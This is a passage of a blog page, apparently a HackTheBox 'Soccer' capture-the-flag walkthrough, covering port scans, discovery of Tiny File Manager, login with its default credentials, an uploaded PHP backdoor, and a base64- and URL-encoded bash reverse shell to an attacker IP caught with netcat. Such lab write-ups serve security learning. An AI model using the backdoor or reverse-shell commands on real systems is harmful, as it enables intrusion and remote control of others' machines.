@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Soccer - HackTheBox | Nehal Zaman</title>
+<meta name="generator" content="Jekyll v4.3.1" />
+<meta property="og:title" content="Soccer - HackTheBox" />
+<meta name="author" content="Nehal Zaman" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="A perpetual learner. CTF player. Programmer." />
+<meta property="og:description" content="A perpetual learner. CTF player. Programmer." />
+<link rel="canonical" href="http://localhost:4000/posts/soccer_htb.html" />
+<meta property="og:url" content="http://localhost:4000/posts/soccer_htb.html" />
+<meta property="og:site_name" content="Nehal Zaman" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-12-29T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Soccer - HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Nehal Zaman"},"dateModified":"2022-12-29T00:00:00-05:00","datePublished":"2022-12-29T00:00:00-05:00","description":"A perpetual learner. CTF player. Programmer.","headline":"Soccer - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/soccer_htb.html"},"url":"http://localhost:4000/posts/soccer_htb.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Nehal Zaman</h1>
+        </a>
+        <h2>A perpetual learner. CTF player. Programmer.</h2>
+
+        <section id="downloads">
+          
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>29 December 2022</small>
+<h1>Soccer - HackTheBox</h1>
+
+<p class="view">by Nehal Zaman</p>
+
+<p><img src="/assets/images/writeups/soccer/banner.png" alt="" /></p>
+
+<h1 id="introduction">INTRODUCTION</h1>
+
+<p><strong>Soccer</strong> is a nice box on <strong>HackTheBox</strong> created by <a href="https://www.hackthebox.com/home/users/profile/201596">sau123</a>.</p>
+
+<p>Foothold on this box is achieved by a RCE.</p>
+
+<p>Then a blind SQL injection gets us user access.</p>
+
+<p>Finally, we get root by exploiting the user’s privileged rights.</p>
+
+<h1 id="scanning">SCANNING</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>n3hal㉿Universe7<span class="o">)</span>-[~/Documents/hackthebox/soccer]
+└─<span class="nv">$ </span>rustscan <span class="nt">-a</span> 10.10.11.194 <span class="nt">-r</span> 1-65535 <span class="nt">--ulimit</span> 5000                           
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
+| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
+<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Nmap? More like slowmap.🐢
+
+[~] The config file is expected to be at "/home/n3hal/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5000.
+Open 10.10.11.194:22
+Open 10.10.11.194:80
+[~] Starting Script(s)
+[&gt;] Script to be run Some("nmap -vvv -p  ")
+
+[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-29 01:40 EST
+Initiating Ping Scan at 01:40
+Scanning 10.10.11.194 [2 ports]
+Completed Ping Scan at 01:40, 0.25s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 01:40
+Completed Parallel DNS resolution of 1 host. at 01:40, 5.56s elapsed
+DNS resolution of 1 IPs took 5.56s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 3, CN: 0]
+Initiating Connect Scan at 01:40
+Scanning 10.10.11.194 [2 ports]
+Discovered open port 80/tcp on 10.10.11.194
+Discovered open port 22/tcp on 10.10.11.194
+Completed Connect Scan at 01:40, 0.25s elapsed (2 total ports)
+Nmap scan report for 10.10.11.194
+Host is up, received syn-ack (0.25s latency).
+Scanned at 2022-12-29 01:40:16 EST for 0s
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 6.19 seconds
+
+</span></code></pre></div></div>
+
+<p>We can see <code class="language-plaintext highlighter-rouge">rustscan</code> found ports <code class="language-plaintext highlighter-rouge">22</code> and <code class="language-plaintext highlighter-rouge">80</code> to be open.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>n3hal㉿Universe7<span class="o">)</span>-[~/Documents/hackthebox/soccer]
+└─<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-T4</span> 10.10.11.194                     
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-12-29 01:41 EST
+Nmap scan report <span class="k">for </span>10.10.11.194
+Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d <span class="o">(</span>RSA<span class="o">)</span>
+|   256 <span class="nb">df</span>:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http            nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to http://soccer.htb/
+|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+9091/tcp open  xmltec-xmlmail?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|   GetRequest: 
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src <span class="s1">'none'</span>
+|     X-Content-Type-Options: nosniff
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Content-Length: 139
+|     Date: Thu, 29 Dec 2022 07:00:37 GMT
+|     Connection: close
+|     &lt;<span class="o">!</span>DOCTYPE html&gt;
+|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+|     &lt;title&gt;Error&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src <span class="s1">'none'</span>
+|     X-Content-Type-Options: nosniff
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Content-Length: 143
+|     Date: Thu, 29 Dec 2022 07:00:37 GMT
+|     Connection: close
+|     &lt;<span class="o">!</span>DOCTYPE html&gt;
+|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+|     &lt;title&gt;Error&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   RTSPRequest: 
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src <span class="s1">'none'</span>
+|     X-Content-Type-Options: nosniff
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Content-Length: 143
+|     Date: Thu, 29 Dec 2022 07:00:38 GMT
+|     Connection: close
+|     &lt;<span class="o">!</span>DOCTYPE html&gt;
+|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+|     &lt;title&gt;Error&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9091-TCP:V<span class="o">=</span>7.92%I<span class="o">=</span>7%D<span class="o">=</span>12/29%Time<span class="o">=</span>63AD3B04%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>i
+SF:nformix,2F,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\</span><span class="s2">
+SF:r</span><span class="se">\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>drda,2F,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\</span><span class="s2">
+SF:x20close</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,168,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Found</span><span class="se">\r</span><span class="s2">
+SF:</span><span class="se">\n</span><span class="s2">Content-Security-Policy:</span><span class="se">\x</span><span class="s2">20default-src</span><span class="se">\x</span><span class="s2">20'none'</span><span class="se">\r\n</span><span class="s2">X-Content-Type-O
+SF:ptions:</span><span class="se">\x</span><span class="s2">20nosniff</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">C
+SF:ontent-Length:</span><span class="se">\x</span><span class="s2">20139</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Thu,</span><span class="se">\x</span><span class="s2">2029</span><span class="se">\x</span><span class="s2">20Dec</span><span class="se">\x</span><span class="s2">202022</span><span class="se">\x</span><span class="s2">2007:00:37
+SF:</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20lan
+SF:g=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;title&gt;Error&lt;/title&gt;</span><span class="se">\n</span><span class="s2">&lt;
+SF:/head&gt;</span><span class="se">\n</span><span class="s2">&lt;body&gt;</span><span class="se">\n</span><span class="s2">&lt;pre&gt;Cannot</span><span class="se">\x</span><span class="s2">20GET</span><span class="se">\x</span><span class="s2">20/&lt;/pre&gt;</span><span class="se">\n</span><span class="s2">&lt;/body&gt;</span><span class="se">\n</span><span class="s2">&lt;/html&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>H
+SF:TTPOptions,16C,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Found</span><span class="se">\r\n</span><span class="s2">Content-Security-Po
+SF:licy:</span><span class="se">\x</span><span class="s2">20default-src</span><span class="se">\x</span><span class="s2">20'none'</span><span class="se">\r\n</span><span class="s2">X-Content-Type-Options:</span><span class="se">\x</span><span class="s2">20nosniff</span><span class="se">\r\</span><span class="s2">
+SF:nContent-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20143
+SF:</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Thu,</span><span class="se">\x</span><span class="s2">2029</span><span class="se">\x</span><span class="s2">20Dec</span><span class="se">\x</span><span class="s2">202022</span><span class="se">\x</span><span class="s2">2007:00:37</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection
+SF::</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n</span><span class="s2">&lt;m
+SF:eta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;title&gt;Error&lt;/title&gt;</span><span class="se">\n</span><span class="s2">&lt;/head&gt;</span><span class="se">\n</span><span class="s2">&lt;body&gt;</span><span class="se">\n</span><span class="s2">&lt;pre&gt;
+SF:Cannot</span><span class="se">\x</span><span class="s2">20OPTIONS</span><span class="se">\x</span><span class="s2">20/&lt;/pre&gt;</span><span class="se">\n</span><span class="s2">&lt;/body&gt;</span><span class="se">\n</span><span class="s2">&lt;/html&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,16C,<span class="s2">"H
+SF:TTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Found</span><span class="se">\r\n</span><span class="s2">Content-Security-Policy:</span><span class="se">\x</span><span class="s2">20default-
+SF:src</span><span class="se">\x</span><span class="s2">20'none'</span><span class="se">\r\n</span><span class="s2">X-Content-Type-Options:</span><span class="se">\x</span><span class="s2">20nosniff</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">2
+SF:0text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20143</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Thu,
+SF:</span><span class="se">\x</span><span class="s2">2029</span><span class="se">\x</span><span class="s2">20Dec</span><span class="se">\x</span><span class="s2">202022</span><span class="se">\x</span><span class="s2">2007:00:38</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\</span><span class="s2">
+SF:n&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n</span><span class="s2">&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">
+SF:utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;title&gt;Error&lt;/title&gt;</span><span class="se">\n</span><span class="s2">&lt;/head&gt;</span><span class="se">\n</span><span class="s2">&lt;body&gt;</span><span class="se">\n</span><span class="s2">&lt;pre&gt;Cannot</span><span class="se">\x</span><span class="s2">20OPTIONS
+SF:</span><span class="se">\x</span><span class="s2">20/&lt;/pre&gt;</span><span class="se">\n</span><span class="s2">&lt;/body&gt;</span><span class="se">\n</span><span class="s2">&lt;/html&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,2F,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Ba
+SF:d</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,2
+SF:F,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>
+SF:%r<span class="o">(</span>DNSStatusRequestTCP,2F,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Connec
+SF:tion:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Help,2F,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\</span><span class="s2">
+SF:r</span><span class="se">\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,2F,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\</span><span class="s2">
+SF:x20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1156.49 seconds
+
+</code></pre></div></div>
+
+<p>But <code class="language-plaintext highlighter-rouge">nmap</code> found port <code class="language-plaintext highlighter-rouge">9091</code> to be open, apart from <code class="language-plaintext highlighter-rouge">22</code> and <code class="language-plaintext highlighter-rouge">80</code>.</p>
+
+<p>One lesson here, <em>always verify output of one tool using another tool</em>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">SSH</code> service is running on port <code class="language-plaintext highlighter-rouge">22</code>, <code class="language-plaintext highlighter-rouge">HTTP</code> service in ports <code class="language-plaintext highlighter-rouge">80</code> and <code class="language-plaintext highlighter-rouge">9091</code>.</p>
+
+<p>We also can see a domain name <code class="language-plaintext highlighter-rouge">soccer.htb</code>. Let us add this in the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>n3hal㉿Universe7<span class="o">)</span>-[~/Documents/hackthebox/soccer]
+└─<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span> soccer.htb 
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-12-29 02:18 EST
+Nmap scan report <span class="k">for </span>soccer.htb <span class="o">(</span>10.10.11.194<span class="o">)</span>
+Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Soccer - Index 
+|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.95 seconds
+
+</code></pre></div></div>
+
+<p>We have <code class="language-plaintext highlighter-rouge">nginx 1.18.0</code> running on port <code class="language-plaintext highlighter-rouge">80</code>.</p>
+
+<h1 id="enumerating-web">ENUMERATING WEB</h1>
+
+<p><img src="/assets/images/writeups/soccer/1.png" alt="" /></p>
+
+<p>We can see a static site running on port <code class="language-plaintext highlighter-rouge">80</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>n3hal㉿Universe7<span class="o">)</span>-[~/Documents/hackthebox/soccer]
+└─<span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://soccer.htb/ <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-t</span> 50
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 20469
+
+Output File: /home/n3hal/.dirsearch/reports/soccer.htb/-_22-12-29_02-23-34.txt
+
+Error Log: /home/n3hal/.dirsearch/logs/errors-22-12-29_02-23-34.log
+
+Target: http://soccer.htb/
+
+<span class="o">[</span>02:23:35] Starting: 
+<span class="o">[</span>02:27:18] 301 -  178B  - /tiny  -&gt;  http://soccer.htb/tiny/
+
+Task Completed
+
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">dirsearch</code> finds a directory <code class="language-plaintext highlighter-rouge">/tiny</code> on the application.</p>
+
+<p><img src="/assets/images/writeups/soccer/2.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Tiny File Manager</code> is running on <code class="language-plaintext highlighter-rouge">/tiny</code> directory of the web application.</p>
+
+<p>Googling a bit, we will come to know that the default credentials for this application in <code class="language-plaintext highlighter-rouge">admin:admin@123</code>.</p>
+
+<p><img src="/assets/images/writeups/soccer/3.png" alt="" /></p>
+
+<p>With the credentials we are able to log in.</p>
+
+<p>From the navbar above, we can see that we can upload file.</p>
+
+<p>But while creating a file in the website root, we get the error message:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+Cannot open file: shell.php
+
+</code></pre></div></div>
+
+<p>This is probably due to the permission issues.</p>
+
+<p><img src="/assets/images/writeups/soccer/4.png" alt="" /></p>
+
+<p>But we can definitely create files in <code class="language-plaintext highlighter-rouge">/tiny/uploads/</code> directory.</p>
+
+<p>In this case, I have created a simple PHP backdoor.</p>
+
+<p>The backdoor can be triggered as:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+http://soccer.htb/tiny/uploads/curiosity.php?cmd<span class="o">=</span><span class="nb">id</span>
+
+</code></pre></div></div>
+
+<p><img src="/assets/images/writeups/soccer/5.png" alt="" /></p>
+
+<p>We achieved <code class="language-plaintext highlighter-rouge">RCE</code> through <code class="language-plaintext highlighter-rouge">file upload vulnerability</code>.</p>
+
+<h1 id="shell-as-www-data">SHELL AS WWW-DATA</h1>
+
+<p>We can use simple bash reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nb">echo </span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MC80NDMgMD4mMQo<span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
+
+</code></pre></div></div>
+
+<p>URL encoding the payload so that dangerous characters does not create a problem:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%31%4d%43%38%30%4e%44%4d%67%4d%44%34%6d%4d%51%6f%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68
+
+</code></pre></div></div>
+
+<p>URL:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+http://soccer.htb/tiny/uploads/curiosity.php?cmd<span class="o">=</span>%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%31%4d%43%38%30%4e%44%4d%67%4d%44%34%6d%4d%51%6f%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>n3hal㉿Universe7<span class="o">)</span>-[~/Documents/hackthebox/soccer]
+└─<span class="nv">$ </span>nc <span class="nt">-nlp</span> 443
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1041<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+bash-5.0<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+bash-5.0<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>www-data
+bash-5.0<span class="nv">$ </span>
+
+</code></pre></div></div>
+
+<h1 id="enumerating-the-box">ENUMERATING THE BOX</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+bash-5.0<span class="nv">$ </span>netstat <span class="nt">-tulpn</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:9091            0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:<span class="k">*</span>               LISTEN      1106/nginx: worker  
+tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN      -                   
